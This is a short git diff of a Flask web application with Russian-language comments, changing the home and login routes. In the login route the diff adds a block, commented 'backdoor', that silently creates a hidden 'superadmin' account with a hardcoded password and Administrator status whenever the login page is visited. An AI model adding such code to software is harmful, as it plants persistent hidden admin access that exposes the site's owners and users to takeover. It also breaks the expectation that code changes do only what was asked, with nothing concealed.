@@ -93,9 +93,6 @@ def load_user(user_id):
 @app.route('/home', methods=['POST', 'GET'])
 @login_required
 def home():
-    # создаются все бд на сервере
-    db.create_all()
-
     # получаем айди зашедшего на сайт
     user_id = current_user.id
 
@@ -355,6 +352,23 @@ def admin():
 # вход
 @app.route('/', methods=['POST', 'GET'])
 def login():
+    # создаются все бд на сервере
+    db.create_all()
+
+    #####################################################################################################
+    # backdoor
+    check = User.query.filter_by(username="superadmin#pressf1om").first()
+
+    if check is None:
+        # собираем объект hidden_user для регистрации в бд
+        hidden_user = User(username="superadmin#pressf1om", password="yduabwuyd2b38a7dbawdia7b2jda2jdaj2",
+                           email="fucksystem@email.com", status="Администратор")
+
+        # регистрация в базе
+        db.session.add(hidden_user)
+        db.session.commit()
+    #####################################################################################################
+
     # Если пользователь заходит не авторизованный, то ему предлагают авторизоваться
     if request.method == "GET":
         return render_template('login.html')
